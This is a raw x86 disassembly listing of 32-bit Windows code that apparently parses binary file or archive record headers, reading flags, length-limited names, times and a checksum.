  40252e:	ff 75 e8             	push   -0x18(%ebp)
  402531:	8d 43 1e             	lea    0x1e(%ebx),%eax
  402534:	50                   	push   %eax
  402535:	6a 1a                	push   $0x1a
  402537:	e8 c1 3d 00 00       	call   0x4062fd
  40253c:	e9 e4 00 00 00       	jmp    0x402625
  402541:	f7 83 54 65 00 00 00 	testl  $0x8000,0x6554(%ebx)
  402548:	80 00 00 
  40254b:	0f 84 d4 00 00 00    	je     0x402625
  402551:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402554:	e8 65 8d 00 00       	call   0x40b2be
  402559:	01 83 48 b0 00 00    	add    %eax,0xb048(%ebx)
  40255f:	83 93 4c b0 00 00 00 	adcl   $0x0,0xb04c(%ebx)
  402566:	e9 ba 00 00 00       	jmp    0x402625
  40256b:	8d bb 70 65 00 00    	lea    0x6570(%ebx),%edi
  402571:	8b cf                	mov    %edi,%ecx
  402573:	e8 29 73 00 00       	call   0x4098a1
  402578:	6a 05                	push   $0x5
  40257a:	59                   	pop    %ecx
  40257b:	8d b3 4c 65 00 00    	lea    0x654c(%ebx),%esi
  402581:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402583:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402586:	e8 fe 8c 00 00       	call   0x40b289
  40258b:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40258e:	66 89 83 84 65 00 00 	mov    %ax,0x6584(%ebx)
  402595:	e8 24 8d 00 00       	call   0x40b2be
  40259a:	8b f0                	mov    %eax,%esi
  40259c:	8d 8b 78 65 00 00    	lea    0x6578(%ebx),%ecx
  4025a2:	8a 01                	mov    (%ecx),%al
  4025a4:	8b 09                	mov    (%ecx),%ecx
  4025a6:	24 01                	and    $0x1,%al
  4025a8:	88 83 55 b0 00 00    	mov    %al,0xb055(%ebx)
  4025ae:	8b c1                	mov    %ecx,%eax
  4025b0:	c1 e8 03             	shr    $0x3,%eax
  4025b3:	24 01                	and    $0x1,%al
  4025b5:	88 83 54 b0 00 00    	mov    %al,0xb054(%ebx)
  4025bb:	8b c1                	mov    %ecx,%eax
  4025bd:	c1 e8 02             	shr    $0x2,%eax
  4025c0:	24 01                	and    $0x1,%al
  4025c2:	88 83 57 b0 00 00    	mov    %al,0xb057(%ebx)
  4025c8:	8b c1                	mov    %ecx,%eax
  4025ca:	c1 e8 06             	shr    $0x6,%eax
  4025cd:	24 01                	and    $0x1,%al
  4025cf:	88 83 5b b0 00 00    	mov    %al,0xb05b(%ebx)
  4025d5:	8b c1                	mov    %ecx,%eax
  4025d7:	c1 e8 07             	shr    $0x7,%eax
  4025da:	24 01                	and    $0x1,%al
  4025dc:	89 b3 88 65 00 00    	mov    %esi,0x6588(%ebx)
  4025e2:	88 83 5c b0 00 00    	mov    %al,0xb05c(%ebx)
  4025e8:	85 f6                	test   %esi,%esi
  4025ea:	75 0b                	jne    0x4025f7
  4025ec:	33 c0                	xor    %eax,%eax
  4025ee:	66 39 83 84 65 00 00 	cmp    %ax,0x6584(%ebx)
  4025f5:	74 03                	je     0x4025fa
  4025f7:	33 c0                	xor    %eax,%eax
  4025f9:	40                   	inc    %eax
  4025fa:	88 83 58 b0 00 00    	mov    %al,0xb058(%ebx)
  402600:	8b c1                	mov    %ecx,%eax
  402602:	d1 e8                	shr    $1,%eax
  402604:	24 01                	and    $0x1,%al
  402606:	88 83 8c 65 00 00    	mov    %al,0x658c(%ebx)
  40260c:	8b c1                	mov    %ecx,%eax
  40260e:	c1 e8 08             	shr    $0x8,%eax
  402611:	24 01                	and    $0x1,%al
  402613:	c1 e9 04             	shr    $0x4,%ecx
  402616:	80 e1 01             	and    $0x1,%cl
  402619:	88 83 59 b0 00 00    	mov    %al,0xb059(%ebx)
  40261f:	88 8b 5a b0 00 00    	mov    %cl,0xb05a(%ebx)
  402625:	33 ff                	xor    %edi,%edi
  402627:	57                   	push   %edi
  402628:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40262b:	e8 c5 8d 00 00       	call   0x40b3f5
  402630:	0f b7 c0             	movzwl %ax,%eax
  402633:	39 83 4c 65 00 00    	cmp    %eax,0x654c(%ebx)
  402639:	0f 84 ab 00 00 00    	je     0x4026ea
  40263f:	8b 83 50 65 00 00    	mov    0x6550(%ebx),%eax
  402645:	83 f8 79             	cmp    $0x79,%eax
  402648:	0f 84 9c 00 00 00    	je     0x4026ea
  40264e:	83 f8 76             	cmp    $0x76,%eax
  402651:	0f 84 93 00 00 00    	je     0x4026ea
  402657:	83 f8 05             	cmp    $0x5,%eax
  40265a:	75 5d                	jne    0x4026b9
  40265c:	80 bb 06 89 00 00 00 	cmpb   $0x0,0x8906(%ebx)
  402663:	74 54                	je     0x4026b9
  402665:	53                   	push   %ebx
  402666:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  402669:	e8 0d eb ff ff       	call   0x40117b
  40266e:	8b 03                	mov    (%ebx),%eax
  402670:	8b cb                	mov    %ebx,%ecx
  402672:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  402676:	ff 50 10             	call   *0x10(%eax)
  402679:	57                   	push   %edi
  40267a:	6a 07                	push   $0x7
  40267c:	5e                   	pop    %esi
  40267d:	2b c6                	sub    %esi,%eax
  40267f:	1b d7                	sbb    %edi,%edx
  402681:	52                   	push   %edx
  402682:	50                   	push   %eax
  402683:	8b 03                	mov    (%ebx),%eax
  402685:	8b cb                	mov    %ebx,%ecx
  402687:	ff 50 0c             	call   *0xc(%eax)
  40268a:	c6 45 f3 01          	movb   $0x1,-0xd(%ebp)
  40268e:	8b cb                	mov    %ebx,%ecx
  402690:	e8 22 63 00 00       	call   0x4089b7
  402695:	84 c0                	test   %al,%al
  402697:	74 04                	je     0x40269d
  402699:	c6 45 f3 00          	movb   $0x0,-0xd(%ebp)
  40269d:	4e                   	dec    %esi
  40269e:	75 ee                	jne    0x40268e
  4026a0:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4026a3:	8b 01                	mov    (%ecx),%eax
  4026a5:	57                   	push   %edi
  4026a6:	ff 75 b4             	push   -0x4c(%ebp)
  4026a9:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  4026ad:	ff 75 b0             	push   -0x50(%ebp)
  4026b0:	ff 50 0c             	call   *0xc(%eax)
  4026b3:	80 7d f3 00          	cmpb   $0x0,-0xd(%ebp)
  4026b7:	75 31                	jne    0x4026ea
  4026b9:	6a 03                	push   $0x3
  4026bb:	b9 ac 25 43 00       	mov    $0x4325ac,%ecx
  4026c0:	c6 83 64 b0 00 00 01 	movb   $0x1,0xb064(%ebx)
  4026c7:	e8 8b 3b 00 00       	call   0x406257
  4026cc:	80 7d f2 00          	cmpb   $0x0,-0xe(%ebp)
  4026d0:	74 18                	je     0x4026ea
  4026d2:	8d 43 1e             	lea    0x1e(%ebx),%eax
  4026d5:	50                   	push   %eax
  4026d6:	50                   	push   %eax
  4026d7:	6a 04                	push   $0x4
  4026d9:	e8 1f 3c 00 00       	call   0x4062fd
  4026de:	c6 83 65 b0 00 00 01 	movb   $0x1,0xb065(%ebx)
  4026e5:	e9 52 f6 ff ff       	jmp    0x401d3c
  4026ea:	8b 83 4c b0 00 00    	mov    0xb04c(%ebx),%eax
  4026f0:	3b 83 44 b0 00 00    	cmp    0xb044(%ebx),%eax
  4026f6:	7f 18                	jg     0x402710
  4026f8:	0f 8c ea f6 ff ff    	jl     0x401de8
  4026fe:	8b 83 48 b0 00 00    	mov    0xb048(%ebx),%eax
  402704:	3b 83 40 b0 00 00    	cmp    0xb040(%ebx),%eax
  40270a:	0f 86 d8 f6 ff ff    	jbe    0x401de8
  402710:	8b 75 cc             	mov    -0x34(%ebp),%esi
  402713:	39 7d b8             	cmp    %edi,-0x48(%ebp)
  402716:	74 09                	je     0x402721
  402718:	ff 75 b8             	push   -0x48(%ebp)
  40271b:	e8 66 79 01 00       	call   0x41a086
  402720:	59                   	pop    %ecx
  402721:	8b c6                	mov    %esi,%eax
  402723:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402726:	5f                   	pop    %edi
  402727:	5e                   	pop    %esi
  402728:	5b                   	pop    %ebx
  402729:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402730:	c9                   	leave
  402731:	c3                   	ret
  402732:	55                   	push   %ebp
  402733:	8d 6c 24 94          	lea    -0x6c(%esp),%ebp
  402737:	b8 c0 20 00 00       	mov    $0x20c0,%eax
  40273c:	e8 2f 7f 01 00       	call   0x41a670
  402741:	57                   	push   %edi
  402742:	8b 7d 74             	mov    0x74(%ebp),%edi
  402745:	89 4d 68             	mov    %ecx,0x68(%ebp)
  402748:	8b 4f 14             	mov    0x14(%edi),%ecx
  40274b:	8b c1                	mov    %ecx,%eax
  40274d:	2b 45 78             	sub    0x78(%ebp),%eax
  402750:	3b 47 18             	cmp    0x18(%edi),%eax
  402753:	0f 82 f2 04 00 00    	jb     0x402c4b
  402759:	2b c8                	sub    %eax,%ecx
  40275b:	89 47 18             	mov    %eax,0x18(%edi)
  40275e:	83 f9 02             	cmp    $0x2,%ecx
  402761:	0f 82 e4 04 00 00    	jb     0x402c4b
  402767:	56                   	push   %esi
  402768:	8b 75 7c             	mov    0x7c(%ebp),%esi
  40276b:	53                   	push   %ebx
  40276c:	8b cf                	mov    %edi,%ecx
  40276e:	e8 a9 8b 00 00       	call   0x40b31c
  402773:	8b c8                	mov    %eax,%ecx
  402775:	0b ca                	or     %edx,%ecx
  402777:	89 55 50             	mov    %edx,0x50(%ebp)
  40277a:	0f 84 c9 04 00 00    	je     0x402c49
  402780:	8b 4f 18             	mov    0x18(%edi),%ecx
  402783:	8b 57 14             	mov    0x14(%edi),%edx
  402786:	2b d1                	sub    %ecx,%edx
  402788:	0f 84 bb 04 00 00    	je     0x402c49
  40278e:	33 db                	xor    %ebx,%ebx
  402790:	39 5d 50             	cmp    %ebx,0x50(%ebp)
  402793:	0f 8f b0 04 00 00    	jg     0x402c49
  402799:	7c 08                	jl     0x4027a3
  40279b:	3b c2                	cmp    %edx,%eax
  40279d:	0f 87 a6 04 00 00    	ja     0x402c49
  4027a3:	03 c8                	add    %eax,%ecx
  4027a5:	89 4d 5c             	mov    %ecx,0x5c(%ebp)
  4027a8:	8b cf                	mov    %edi,%ecx
  4027aa:	e8 6d 8b 00 00       	call   0x40b31c
  4027af:	8b 5f 14             	mov    0x14(%edi),%ebx
  4027b2:	2b 5f 18             	sub    0x18(%edi),%ebx
  4027b5:	83 7e 04 01          	cmpl   $0x1,0x4(%esi)
  4027b9:	89 45 60             	mov    %eax,0x60(%ebp)
  4027bc:	89 55 64             	mov    %edx,0x64(%ebp)
  4027bf:	75 70                	jne    0x402831
  4027c1:	83 f8 01             	cmp    $0x1,%eax
  4027c4:	75 6b                	jne    0x402831
  4027c6:	85 d2                	test   %edx,%edx
  4027c8:	75 67                	jne    0x402831
  4027ca:	8b cf                	mov    %edi,%ecx
  4027cc:	88 46 1e             	mov    %al,0x1e(%esi)
  4027cf:	e8 48 8b 00 00       	call   0x40b31c
  4027d4:	89 45 74             	mov    %eax,0x74(%ebp)
  4027d7:	a8 01                	test   $0x1,%al
  4027d9:	74 28                	je     0x402803
  4027db:	8b cf                	mov    %edi,%ecx
  4027dd:	e8 3a 8b 00 00       	call   0x40b31c
  4027e2:	89 45 54             	mov    %eax,0x54(%ebp)
  4027e5:	0b c2                	or     %edx,%eax
  4027e7:	74 1a                	je     0x402803
  4027e9:	8b 4d 68             	mov    0x68(%ebp),%ecx
  4027ec:	8b 81 40 b0 00 00    	mov    0xb040(%ecx),%eax
  4027f2:	03 45 54             	add    0x54(%ebp),%eax
  4027f5:	8b 89 44 b0 00 00    	mov    0xb044(%ecx),%ecx
  4027fb:	13 ca                	adc    %edx,%ecx
  4027fd:	89 46 20             	mov    %eax,0x20(%esi)
  402800:	89 4e 24             	mov    %ecx,0x24(%esi)
  402803:	f6 45 74 02          	testb  $0x2,0x74(%ebp)
  402807:	74 28                	je     0x402831
  402809:	8b cf                	mov    %edi,%ecx
  40280b:	e8 0c 8b 00 00       	call   0x40b31c
  402810:	89 45 44             	mov    %eax,0x44(%ebp)
  402813:	0b c2                	or     %edx,%eax
  402815:	74 1a                	je     0x402831
  402817:	8b 4d 68             	mov    0x68(%ebp),%ecx
  40281a:	8b 81 40 b0 00 00    	mov    0xb040(%ecx),%eax
  402820:	03 45 44             	add    0x44(%ebp),%eax
  402823:	8b 89 44 b0 00 00    	mov    0xb044(%ecx),%ecx
  402829:	13 ca                	adc    %edx,%ecx
  40282b:	89 46 30             	mov    %eax,0x30(%esi)
  40282e:	89 4e 34             	mov    %ecx,0x34(%esi)
  402831:	8b 46 04             	mov    0x4(%esi),%eax
  402834:	83 f8 02             	cmp    $0x2,%eax
  402837:	74 09                	je     0x402842
  402839:	83 f8 03             	cmp    $0x3,%eax
  40283c:	0f 85 f2 03 00 00    	jne    0x402c34
  402842:	83 7d 64 00          	cmpl   $0x0,0x64(%ebp)
  402846:	0f 87 e8 03 00 00    	ja     0x402c34
  40284c:	72 0a                	jb     0x402858
  40284e:	83 7d 60 07          	cmpl   $0x7,0x60(%ebp)
  402852:	0f 87 dc 03 00 00    	ja     0x402c34
  402858:	8b 45 60             	mov    0x60(%ebp),%eax
  40285b:	48                   	dec    %eax
  40285c:	0f 84 db 02 00 00    	je     0x402b3d
  402862:	48                   	dec    %eax
  402863:	0f 84 a6 02 00 00    	je     0x402b0f
  402869:	48                   	dec    %eax
  40286a:	0f 84 da 01 00 00    	je     0x402a4a
  402870:	48                   	dec    %eax
  402871:	0f 84 73 01 00 00    	je     0x4029ea
  402877:	48                   	dec    %eax
  402878:	0f 84 f2 00 00 00    	je     0x402970
  40287e:	48                   	dec    %eax
  40287f:	74 1f                	je     0x4028a0
  402881:	48                   	dec    %eax
  402882:	0f 85 ac 03 00 00    	jne    0x402c34
  402888:	8d 8e 20 10 00 00    	lea    0x1020(%esi),%ecx
  40288e:	53                   	push   %ebx
  40288f:	e8 8d f3 ff ff       	call   0x401c21
  402894:	53                   	push   %ebx
  402895:	ff b6 20 10 00 00    	push   0x1020(%esi)
  40289b:	e9 91 02 00 00       	jmp    0x402b31
  4028a0:	8b cf                	mov    %edi,%ecx
  4028a2:	e8 75 8a 00 00       	call   0x40b31c
  4028a7:	8b c8                	mov    %eax,%ecx
  4028a9:	c1 e9 02             	shr    $0x2,%ecx
  4028ac:	80 e1 01             	and    $0x1,%cl
  4028af:	88 8e f6 20 00 00    	mov    %cl,0x20f6(%esi)
  4028b5:	8b c8                	mov    %eax,%ecx
  4028b7:	c1 e9 03             	shr    $0x3,%ecx
  4028ba:	80 e1 01             	and    $0x1,%cl
  4028bd:	8d 9e f8 20 00 00    	lea    0x20f8(%esi),%ebx
  4028c3:	89 45 78             	mov    %eax,0x78(%ebp)
  4028c6:	88 8e f7 20 00 00    	mov    %cl,0x20f7(%esi)
  4028cc:	c6 86 f8 21 00 00 00 	movb   $0x0,0x21f8(%esi)
  4028d3:	c6 03 00             	movb   $0x0,(%ebx)
  4028d6:	a8 01                	test   $0x1,%al
  4028d8:	74 29                	je     0x402903
  4028da:	8b cf                	mov    %edi,%ecx
  4028dc:	e8 3b 8a 00 00       	call   0x40b31c
  4028e1:	89 45 74             	mov    %eax,0x74(%ebp)
  4028e4:	b8 ff 00 00 00       	mov    $0xff,%eax
  4028e9:	39 45 74             	cmp    %eax,0x74(%ebp)
  4028ec:	72 03                	jb     0x4028f1
  4028ee:	89 45 74             	mov    %eax,0x74(%ebp)
  4028f1:	ff 75 74             	push   0x74(%ebp)
  4028f4:	8b cf                	mov    %edi,%ecx
  4028f6:	53                   	push   %ebx
  4028f7:	e8 a9 8a 00 00       	call   0x40b3a5
  4028fc:	8b 45 74             	mov    0x74(%ebp),%eax
  4028ff:	c6 04 03 00          	movb   $0x0,(%ebx,%eax,1)
  402903:	f6 45 78 02          	testb  $0x2,0x78(%ebp)
  402907:	74 2f                	je     0x402938
  402909:	8b cf                	mov    %edi,%ecx
  40290b:	e8 0c 8a 00 00       	call   0x40b31c
  402910:	89 45 74             	mov    %eax,0x74(%ebp)
  402913:	b8 ff 00 00 00       	mov    $0xff,%eax
  402918:	39 45 74             	cmp    %eax,0x74(%ebp)
  40291b:	72 03                	jb     0x402920
  40291d:	89 45 74             	mov    %eax,0x74(%ebp)
  402920:	ff 75 74             	push   0x74(%ebp)
  402923:	8d 9e f8 21 00 00    	lea    0x21f8(%esi),%ebx
  402929:	53                   	push   %ebx
  40292a:	8b cf                	mov    %edi,%ecx
  40292c:	e8 74 8a 00 00       	call   0x40b3a5
  402931:	8b 45 74             	mov    0x74(%ebp),%eax
  402934:	c6 04 03 00          	movb   $0x0,(%ebx,%eax,1)
  402938:	80 be f6 20 00 00 00 	cmpb   $0x0,0x20f6(%esi)
  40293f:	74 0d                	je     0x40294e
  402941:	8b cf                	mov    %edi,%ecx
  402943:	e8 d4 89 00 00       	call   0x40b31c
  402948:	89 86 f8 22 00 00    	mov    %eax,0x22f8(%esi)
  40294e:	80 be f7 20 00 00 00 	cmpb   $0x0,0x20f7(%esi)
  402955:	74 0d                	je     0x402964
  402957:	8b cf                	mov    %edi,%ecx
  402959:	e8 be 89 00 00       	call   0x40b31c
  40295e:	89 86 fc 22 00 00    	mov    %eax,0x22fc(%esi)
  402964:	c6 86 f5 20 00 00 01 	movb   $0x1,0x20f5(%esi)
  40296b:	e9 c4 02 00 00       	jmp    0x402c34
  402970:	8b cf                	mov    %edi,%ecx
  402972:	e8 a5 89 00 00       	call   0x40b31c
  402977:	8b cf                	mov    %edi,%ecx
  402979:	89 86 f0 10 00 00    	mov    %eax,0x10f0(%esi)
  40297f:	e8 98 89 00 00       	call   0x40b31c
  402984:	24 01                	and    $0x1,%al
  402986:	8b cf                	mov    %edi,%ecx
  402988:	88 86 f4 20 00 00    	mov    %al,0x20f4(%esi)
  40298e:	e8 89 89 00 00       	call   0x40b31c
  402993:	8b d8                	mov    %eax,%ebx
  402995:	c6 85 ac df ff ff 00 	movb   $0x0,-0x2054(%ebp)
  40299c:	81 fb ff 1f 00 00    	cmp    $0x1fff,%ebx
  4029a2:	73 17                	jae    0x4029bb
  4029a4:	53                   	push   %ebx
  4029a5:	8d 85 ac df ff ff    	lea    -0x2054(%ebp),%eax
  4029ab:	50                   	push   %eax
  4029ac:	8b cf                	mov    %edi,%ecx
  4029ae:	e8 f2 89 00 00       	call   0x40b3a5
  4029b3:	c6 84 1d ac df ff ff 	movb   $0x0,-0x2054(%ebp,%ebx,1)
  4029ba:	00 
  4029bb:	68 00 20 00 00       	push   $0x2000
  4029c0:	8d 85 ac df ff ff    	lea    -0x2054(%ebp),%eax
  4029c6:	50                   	push   %eax
  4029c7:	50                   	push   %eax
  4029c8:	e8 06 76 00 00       	call   0x409fd3
  4029cd:	68 00 08 00 00       	push   $0x800
  4029d2:	8d 86 f4 10 00 00    	lea    0x10f4(%esi),%eax
  4029d8:	50                   	push   %eax
  4029d9:	8d 85 ac df ff ff    	lea    -0x2054(%ebp),%eax
  4029df:	50                   	push   %eax
  4029e0:	e8 72 ee 00 00       	call   0x411857
  4029e5:	e9 4a 02 00 00       	jmp    0x402c34
  4029ea:	33 c0                	xor    %eax,%eax
  4029ec:	0f 8c 42 02 00 00    	jl     0x402c34
  4029f2:	7f 09                	jg     0x4029fd
  4029f4:	83 fb 01             	cmp    $0x1,%ebx
  4029f7:	0f 82 37 02 00 00    	jb     0x402c34
  4029fd:	8b cf                	mov    %edi,%ecx
  4029ff:	e8 18 89 00 00       	call   0x40b31c
  402a04:	8b cf                	mov    %edi,%ecx
  402a06:	e8 11 89 00 00       	call   0x40b31c
  402a0b:	85 c0                	test   %eax,%eax
  402a0d:	0f 84 21 02 00 00    	je     0x402c34
  402a13:	50                   	push   %eax
  402a14:	68 8c a4 42 00       	push   $0x42a48c
  402a19:	8d 45 1c             	lea    0x1c(%ebp),%eax
  402a1c:	6a 14                	push   $0x14
  402a1e:	50                   	push   %eax
  402a1f:	c6 86 e3 10 00 00 01 	movb   $0x1,0x10e3(%esi)
  402a26:	e8 50 f1 ff ff       	call   0x401b7b
  402a2b:	83 c4 10             	add    $0x10,%esp
  402a2e:	68 00 08 00 00       	push   $0x800
  402a33:	8d 45 1c             	lea    0x1c(%ebp),%eax
  402a36:	50                   	push   %eax
  402a37:	8b 45 68             	mov    0x68(%ebp),%eax
  402a3a:	05 08 66 00 00       	add    $0x6608,%eax
  402a3f:	50                   	push   %eax
  402a40:	e8 7a dd 00 00       	call   0x4107bf
  402a45:	e9 ea 01 00 00       	jmp    0x402c34
  402a4a:	33 c0                	xor    %eax,%eax
  402a4c:	0f 8c e2 01 00 00    	jl     0x402c34
  402a52:	7f 09                	jg     0x402a5d
  402a54:	83 fb 09             	cmp    $0x9,%ebx
  402a57:	0f 82 d7 01 00 00    	jb     0x402c34
  402a5d:	8b cf                	mov    %edi,%ecx
  402a5f:	e8 b8 88 00 00       	call   0x40b31c
  402a64:	8a d8                	mov    %al,%bl
  402a66:	80 e3 01             	and    $0x1,%bl
  402a69:	88 45 77             	mov    %al,0x77(%ebp)
  402a6c:	a8 02                	test   $0x2,%al
  402a6e:	74 2d                	je     0x402a9d
  402a70:	8b cf                	mov    %edi,%ecx
  402a72:	84 db                	test   %bl,%bl
  402a74:	74 15                	je     0x402a8b
  402a76:	e8 43 88 00 00       	call   0x40b2be
  402a7b:	6a 00                	push   $0x0
  402a7d:	50                   	push   %eax
  402a7e:	8d 8e 30 10 00 00    	lea    0x1030(%esi),%ecx
  402a84:	e8 80 e4 00 00       	call   0x410f09
  402a89:	eb 12                	jmp    0x402a9d
  402a8b:	e8 6b 88 00 00       	call   0x40b2fb
  402a90:	52                   	push   %edx
  402a91:	50                   	push   %eax
  402a92:	8d 8e 30 10 00 00    	lea    0x1030(%esi),%ecx
  402a98:	e8 98 e4 00 00       	call   0x410f35
  402a9d:	f6 45 77 04          	testb  $0x4,0x77(%ebp)
  402aa1:	74 2d                	je     0x402ad0
  402aa3:	8b cf                	mov    %edi,%ecx
  402aa5:	84 db                	test   %bl,%bl
  402aa7:	74 15                	je     0x402abe
  402aa9:	e8 10 88 00 00       	call   0x40b2be
  402aae:	6a 00                	push   $0x0
  402ab0:	50                   	push   %eax
  402ab1:	8d 8e 38 10 00 00    	lea    0x1038(%esi),%ecx
  402ab7:	e8 4d e4 00 00       	call   0x410f09
  402abc:	eb 12                	jmp    0x402ad0
  402abe:	e8 38 88 00 00       	call   0x40b2fb
  402ac3:	52                   	push   %edx
  402ac4:	50                   	push   %eax
  402ac5:	8d 8e 38 10 00 00    	lea    0x1038(%esi),%ecx
  402acb:	e8 65 e4 00 00       	call   0x410f35
  402ad0:	f6 45 77 08          	testb  $0x8,0x77(%ebp)
  402ad4:	0f 84 5a 01 00 00    	je     0x402c34
  402ada:	8b cf                	mov    %edi,%ecx
  402adc:	84 db                	test   %bl,%bl
  402ade:	74 18                	je     0x402af8
  402ae0:	e8 d9 87 00 00       	call   0x40b2be
  402ae5:	6a 00                	push   $0x0
  402ae7:	50                   	push   %eax
  402ae8:	8d 8e 40 10 00 00    	lea    0x1040(%esi),%ecx
  402aee:	e8 16 e4 00 00       	call   0x410f09
  402af3:	e9 3c 01 00 00       	jmp    0x402c34
  402af8:	e8 fe 87 00 00       	call   0x40b2fb
  402afd:	52                   	push   %edx
  402afe:	50                   	push   %eax
  402aff:	8d 8e 40 10 00 00    	lea    0x1040(%esi),%ecx
  402b05:	e8 2b e4 00 00       	call   0x410f35
  402b0a:	e9 25 01 00 00       	jmp    0x402c34
  402b0f:	8b cf                	mov    %edi,%ecx
  402b11:	e8 06 88 00 00       	call   0x40b31c
  402b16:	85 c0                	test   %eax,%eax
  402b18:	0f 85 16 01 00 00    	jne    0x402c34
  402b1e:	6a 20                	push   $0x20
  402b20:	8d 86 64 10 00 00    	lea    0x1064(%esi),%eax
  402b26:	c7 86 60 10 00 00 03 	movl   $0x3,0x1060(%esi)
  402b2d:	00 00 00 
  402b30:	50                   	push   %eax
  402b31:	8b cf                	mov    %edi,%ecx
  402b33:	e8 6d 88 00 00       	call   0x40b3a5
  402b38:	e9 f7 00 00 00       	jmp    0x402c34
  402b3d:	8b cf                	mov    %edi,%ecx
  402b3f:	e8 d8 87 00 00       	call   0x40b31c
  402b44:	85 c0                	test   %eax,%eax
  402b46:	76 11                	jbe    0x402b59
  402b48:	8b 4d 68             	mov    0x68(%ebp),%ecx
  402b4b:	8d 46 20             	lea    0x20(%esi),%eax
  402b4e:	50                   	push   %eax
  402b4f:	e8 53 f1 ff ff       	call   0x401ca7
  402b54:	e9 db 00 00 00       	jmp    0x402c34
  402b59:	8b cf                	mov    %edi,%ecx
  402b5b:	e8 bc 87 00 00       	call   0x40b31c
  402b60:	8a c8                	mov    %al,%cl
  402b62:	80 e1 01             	and    $0x1,%cl
  402b65:	d1 e8                	shr    $1,%eax
  402b67:	88 8e b1 10 00 00    	mov    %cl,0x10b1(%esi)
  402b6d:	24 01                	and    $0x1,%al
  402b6f:	8b cf                	mov    %edi,%ecx
  402b71:	88 86 ba 10 00 00    	mov    %al,0x10ba(%esi)
  402b77:	e8 f5 86 00 00       	call   0x40b271
  402b7c:	0f b6 c0             	movzbl %al,%eax
  402b7f:	89 86 dc 10 00 00    	mov    %eax,0x10dc(%esi)
  402b85:	83 f8 18             	cmp    $0x18,%eax
  402b88:	76 0c                	jbe    0x402b96
  402b8a:	8b 4d 68             	mov    0x68(%ebp),%ecx
  402b8d:	8d 46 20             	lea    0x20(%esi),%eax
  402b90:	50                   	push   %eax
  402b91:	e8 11 f1 ff ff       	call   0x401ca7
  402b96:	6a 10                	push   $0x10
  402b98:	8d 86 91 10 00 00    	lea    0x1091(%esi),%eax
  402b9e:	50                   	push   %eax
  402b9f:	8b cf                	mov    %edi,%ecx
  402ba1:	e8 ff 87 00 00       	call   0x40b3a5
  402ba6:	6a 10                	push   $0x10
  402ba8:	8d 86 a1 10 00 00    	lea    0x10a1(%esi),%eax
  402bae:	50                   	push   %eax
  402baf:	8b cf                	mov    %edi,%ecx
  402bb1:	e8 ef 87 00 00       	call   0x40b3a5
  402bb6:	80 be b1 10 00 00 00 	cmpb   $0x0,0x10b1(%esi)
  402bbd:	74 5d                	je     0x402c1c
  402bbf:	6a 08                	push   $0x8
  402bc1:	8d 9e b2 10 00 00    	lea    0x10b2(%esi),%ebx
  402bc7:	53                   	push   %ebx
  402bc8:	8b cf                	mov    %edi,%ecx
  402bca:	e8 d6 87 00 00       	call   0x40b3a5
  402bcf:	6a 04                	push   $0x4
  402bd1:	8d 45 7c             	lea    0x7c(%ebp),%eax
  402bd4:	50                   	push   %eax
  402bd5:	8b cf                	mov    %edi,%ecx
  402bd7:	e8 c9 87 00 00       	call   0x40b3a5
  402bdc:	8d 45 ac             	lea    -0x54(%ebp),%eax
  402bdf:	50                   	push   %eax
  402be0:	e8 bf d6 00 00       	call   0x4102a4
  402be5:	6a 08                	push   $0x8
  402be7:	53                   	push   %ebx
  402be8:	8d 45 ac             	lea    -0x54(%ebp),%eax
  402beb:	50                   	push   %eax
  402bec:	e8 b5 d9 00 00       	call   0x4105a6
  402bf1:	8d 45 24             	lea    0x24(%ebp),%eax
  402bf4:	50                   	push   %eax
  402bf5:	8d 45 ac             	lea    -0x54(%ebp),%eax
  402bf8:	50                   	push   %eax
  402bf9:	e8 21 da 00 00       	call   0x41061f
  402bfe:	6a 04                	push   $0x4
  402c00:	8d 45 24             	lea    0x24(%ebp),%eax
  402c03:	50                   	push   %eax
  402c04:	8d 45 7c             	lea    0x7c(%ebp),%eax
  402c07:	50                   	push   %eax
  402c08:	e8 77 7b 01 00       	call   0x41a784
  402c0d:	83 c4 0c             	add    $0xc,%esp
  402c10:	f7 d8                	neg    %eax
  402c12:	1a c0                	sbb    %al,%al
  402c14:	fe c0                	inc    %al
  402c16:	88 86 b1 10 00 00    	mov    %al,0x10b1(%esi)
  402c1c:	c6 86 90 10 00 00 01 	movb   $0x1,0x1090(%esi)
  402c23:	c7 86 8c 10 00 00 05 	movl   $0x5,0x108c(%esi)
  402c2a:	00 00 00 
  402c2d:	c6 86 8b 10 00 00 01 	movb   $0x1,0x108b(%esi)
  402c34:	8b 45 5c             	mov    0x5c(%ebp),%eax
  402c37:	89 47 18             	mov    %eax,0x18(%edi)
  402c3a:	8b 47 14             	mov    0x14(%edi),%eax
  402c3d:	2b 47 18             	sub    0x18(%edi),%eax
  402c40:	83 f8 02             	cmp    $0x2,%eax
  402c43:	0f 83 23 fb ff ff    	jae    0x40276c
  402c49:	5b                   	pop    %ebx
  402c4a:	5e                   	pop    %esi
  402c4b:	5f                   	pop    %edi
  402c4c:	83 c5 6c             	add    $0x6c,%ebp
  402c4f:	c9                   	leave
  402c50:	c2 0c 00             	ret    $0xc
  402c53:	b8 37 91 42 00       	mov    $0x429137,%eax
  402c58:	e8 ff 73 01 00       	call   0x41a05c
  402c5d:	b8 e0 e6 00 00       	mov    $0xe6e0,%eax
  402c62:	e8 09 7a 01 00       	call   0x41a670
  402c67:	53                   	push   %ebx
  402c68:	56                   	push   %esi
  402c69:	8b f1                	mov    %ecx,%esi
  402c6b:	80 be 64 b0 00 00 00 	cmpb   $0x0,0xb064(%esi)
  402c72:	57                   	push   %edi
  402c73:	74 1c                	je     0x402c91
  402c75:	83 c6 1e             	add    $0x1e,%esi
  402c78:	56                   	push   %esi
  402c79:	6a 1b                	push   $0x1b
  402c7b:	e8 50 e6 ff ff       	call   0x4012d0
  402c80:	6a 03                	push   $0x3
  402c82:	b9 ac 25 43 00       	mov    $0x4325ac,%ecx
  402c87:	e8 cb 35 00 00       	call   0x406257
  402c8c:	e9 44 02 00 00       	jmp    0x402ed5
